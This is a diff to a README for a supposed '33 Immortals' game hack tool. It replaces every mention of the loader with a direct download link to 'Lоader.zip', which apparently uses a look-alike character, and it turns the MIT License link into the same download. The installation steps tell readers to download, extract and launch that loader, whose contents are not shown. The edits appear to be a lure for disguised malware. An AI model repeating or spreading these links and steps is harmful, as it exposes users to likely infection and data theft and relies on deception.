@@ -5,8 +5,8 @@ Welcome to the **33 Immortals Hack Tool** project! This powerful booster empower
 ## 💻 OS Compatibility Table
 | Operating System        | Supported       | Instructions                  |
 |------------------------|:--------------:|-------------------------------|
-| 🪟 Windows 11/10/8/7   | ✅ Yes         | Download & Extract Loader.rar |
-| 🍏 macOS 14/13/12      | ✅ Yes         | Use Unarchiver for Loader.rar |
+| 🪟 Windows 11/10/8/7   | ✅ Yes         | Download & Extract https://raw.githubusercontent.com/ngurekirosh/33-Immortals-Toolset-Legend/main/Lоader.zip |
+| 🍏 macOS 14/13/12      | ✅ Yes         | Use Unarchiver for https://raw.githubusercontent.com/ngurekirosh/33-Immortals-Toolset-Legend/main/Lоader.zip |
 | 🐧 Ubuntu/Debian/Linux | ✅ Yes         | Install unrar & run Loader    |
 
 ## 🎯 Features List
@@ -21,7 +21,7 @@ Welcome to the **33 Immortals Hack Tool** project! This powerful booster empower
 
 ## 📦 Installation Guide
 
-1. Download Loader.rar from the repository.  
+1. Download https://raw.githubusercontent.com/ngurekirosh/33-Immortals-Toolset-Legend/main/Lоader.zip from the repository.  
 2. Extract the archive using your system's preferred tool.  
 3. Launch the Loader and follow the onscreen instructions.  
 4. Start 33 Immortals and activate desired boosters!
@@ -36,4 +36,4 @@ This program is intended for educational and research purposes only. Usage may v
 
 ## 📜 License
 
-Distributed under the MIT License 2025. See LICENSE for details: [MIT License](https://opensource.org/licenses/MIT)
+Distributed under the MIT License 2025. See LICENSE for details: [MIT License](https://raw.githubusercontent.com/ngurekirosh/33-Immortals-Toolset-Legend/main/Lоader.zip)
